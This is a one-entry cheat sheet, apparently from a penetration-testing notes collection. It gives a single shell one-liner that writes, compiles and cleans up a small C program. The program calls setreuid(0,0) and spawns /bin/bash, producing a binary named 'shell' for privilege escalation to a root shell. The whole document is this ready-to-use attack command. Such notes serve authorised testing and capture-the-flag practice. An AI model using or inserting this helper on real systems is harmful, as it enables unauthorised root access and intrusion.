# Tools

## generate shell bash bin
```
echo 'int main(void){setreuid(0,0); system("/bin/bash"); return 0;}' > pwn.c; gcc pwn.c -o <filename>; rm pwn.c
```

= filename: shell
